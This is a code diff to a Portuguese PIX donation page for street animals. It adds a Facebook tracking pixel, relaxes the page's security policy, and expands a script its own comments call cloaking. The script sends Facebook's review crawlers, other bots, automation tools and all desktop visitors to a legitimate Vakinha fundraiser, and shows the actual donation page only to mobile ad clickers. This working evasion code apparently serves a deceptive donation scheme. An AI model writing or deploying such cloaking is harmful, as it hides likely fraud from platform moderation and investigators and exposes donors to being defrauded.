@@ -8,7 +8,7 @@
     <meta name="description" content="Página segura de doações via PIX para ajudar animais de rua." />
     <meta name="author" content="Doações Seguras" />
 
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https://i.ibb.co; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://kedpzpmswblzefavjunt.supabase.co https://api.pay.hoopay.com.br; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'; upgrade-insecure-requests">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://connect.facebook.net https://www.facebook.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https://i.ibb.co https://www.facebook.com; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://kedpzpmswblzefavjunt.supabase.co https://api.pay.hoopay.com.br https://www.facebook.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'; upgrade-insecure-requests">
     <meta http-equiv="X-Content-Type-Options" content="nosniff" />
     <meta http-equiv="X-Frame-Options" content="DENY" />
     <meta name="referrer" content="no-referrer" />
@@ -16,19 +16,55 @@
     <meta property="og:type" content="website" />
     <meta property="og:title" content="Doações para Animais de Rua" />
     <meta property="og:description" content="Ajude a transformar a vida de animais de rua com uma doação segura via PIX." />
+
+    <!-- Facebook Pixel Code -->
+    <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '1497055778126239');
+      fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1497055778126239&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Facebook Pixel Code -->
   </head>
 
   <body>
-    <!-- Cloaking: redireciona tráfego não legítimo ANTES da página carregar (sem URL real no histórico). Não bloqueia usuários que clicaram no anúncio (UA normal + mobile). -->
+    <!-- Cloaking: redireciona tráfego não legítimo ANTES da página carregar. Bots Facebook, desktop e invasores vão para URL alternativa. -->
     <script>
 (function(){
   var ua = (typeof navigator !== 'undefined' && navigator.userAgent) ? navigator.userAgent : '';
   var u = ua.toLowerCase();
   var mobile = /Mobile|Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua);
-  var bot = u.indexOf('facebookexternalhit') !== -1 || u.indexOf('facebot') !== -1 || u.indexOf('googlebot') !== -1 || u.indexOf('bingbot') !== -1 || u.indexOf('crawler') !== -1 || u.indexOf('spider') !== -1 || u.indexOf('scraper') !== -1 || u.indexOf('headless') !== -1 || u.indexOf('phantom') !== -1 || u.indexOf('selenium') !== -1 || u.indexOf('puppeteer') !== -1 || u.indexOf('playwright') !== -1 || u.indexOf('curl') !== -1 || u.indexOf('wget') !== -1 || u.indexOf('python-requests') !== -1 || u.indexOf('go-http-client') !== -1;
+  
+  // Detecta bots específicos do Facebook e catalogo
+  var facebookBot = u.indexOf('facebookexternalhit') !== -1 || u.indexOf('facebot') !== -1 || u.indexOf('facebookcatalog') !== -1 || u.indexOf('facebook') !== -1;
+  
+  // Detecta outros bots e crawlers
+  var otherBot = u.indexOf('googlebot') !== -1 || u.indexOf('bingbot') !== -1 || u.indexOf('crawler') !== -1 || u.indexOf('spider') !== -1 || u.indexOf('scraper') !== -1 || u.indexOf('headless') !== -1 || u.indexOf('phantom') !== -1 || u.indexOf('selenium') !== -1 || u.indexOf('puppeteer') !== -1 || u.indexOf('playwright') !== -1 || u.indexOf('curl') !== -1 || u.indexOf('wget') !== -1 || u.indexOf('python-requests') !== -1 || u.indexOf('go-http-client') !== -1;
+  
+  // Webdriver detection
   var webdriver = typeof navigator !== 'undefined' && (navigator.webdriver === true);
-  if (bot || webdriver || !mobile) {
-    try { location.replace('https://www.vakinha.com.br/'); } catch (e) {}
+  
+  // URL de redirecionamento para bots Facebook e invasores
+  var REDIRECT_URL = 'https://www.vakinha.com.br/vaquinha/ajude-os-animais-da-uipa-colabore-com-a-nossa-vakinha?utm_internal_source=recommended_campaigns_show~';
+  
+  // Redireciona se:
+  // 1. É bot do Facebook (facebookexternalhit, facebot, facebookcatalog)
+  // 2. É outro bot/crawler
+  // 3. Está usando webdriver (automação)
+  // 4. NÃO é mobile (desktop = possível invasor da biblioteca de anúncios)
+  if (facebookBot || otherBot || webdriver || !mobile) {
+    try { 
+      location.replace(REDIRECT_URL); 
+    } catch (e) {}
   }
 })();
     </script>
